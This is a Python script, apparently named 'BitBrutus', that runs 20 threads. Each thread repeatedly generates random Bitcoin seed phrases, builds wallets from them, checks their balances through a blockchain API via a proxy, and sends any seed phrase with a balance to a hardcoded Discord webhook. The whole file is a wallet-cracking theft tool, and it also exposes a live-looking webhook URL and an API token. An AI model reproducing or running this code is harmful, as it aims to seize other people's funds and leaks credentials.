from cmath import e
from email.utils import collapse_rfc2231_value
from tkinter import E
from bitcoinlib.wallets import Wallet
from bitcoinlib.mnemonic import Mnemonic
from termcolor import colored
from bitcoinlib import wallets
import requests
import blockcypher
import random
from discord_webhook import DiscordWebhook
import time
from threading import *
import json

DSwebhook = 'https://discord.com/api/webhooks/997958355819712542/loez-RCecrSTdZJTK0UtDB170ETpk0rKb0kk4If93uhULJS0ao7Zf6vc7sNxFYtxkoX4'
TOKEN = "4866bb359ef544229f072d97616972d0"
PROXIES = {
  'http': '169.57.1.85:8123'
}

def startBrutus(thread):
 while(True):
  try:
    passphrase = Mnemonic().generate()
    wallets.wallet_delete_if_exists('BitBrutus ' + thread,force=True)
    w = Wallet.create('BitBrutus '+ thread, keys=passphrase, network='bitcoin') 
    
    ##balance = blockcypher.get_total_balance(w.get_key().address,api_key=TOKEN)
    
    balance = json.loads(requests.get('https://chainflyer.bitflyer.jp/v1/address/'+w.get_key().address).text)['unconfirmed_balance']
    print( 'Balance :' ,colored(balance,'yellow'), " | Phrase : ",colored(passphrase,'green') )
    
    if int(balance)>0:
       webhook = DiscordWebhook(url=DSwebhook, content='Found '+balance+' BTC on '+passphrase)
       response = webhook.execute()    
  except Exception as e:
   print(e)
  
for x in range(20):
 Thread(target=startBrutus, args=(str(x),)).start()
 time.sleep(500)

##startBrutus()
